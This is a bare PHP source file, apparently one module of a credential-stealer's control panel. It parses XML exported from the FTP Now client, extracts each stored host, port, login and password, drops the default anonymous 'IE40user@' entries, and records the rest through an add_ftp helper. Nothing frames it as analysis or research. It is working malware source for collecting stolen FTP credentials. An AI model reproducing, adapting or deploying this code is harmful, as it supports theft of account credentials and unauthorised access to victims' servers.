<?php
class Module_ftpnow extends Module_
{
    protected function ProcessItem($Element)
    {
        $User = Assign_($Element->LOGIN);
        $Pass = Assign_($Element->PASSWORD);
        $Port = Assign_($Element->PORT);
        $Host = Assign_($Element->ADDRESS);

        if($Pass != "IE40user@")
            $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
    }

    protected function ProcessItems($Elements)
    {
        if(isset($Elements->ADDRESS))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->ADDRESS))
                $this->ProcessItem($Element);
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
	
    protected function ProcessFTPNow($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        if(isset($XML_))
        {
            $this->ProcessItems($XML_);
        }
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessFTPNow($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
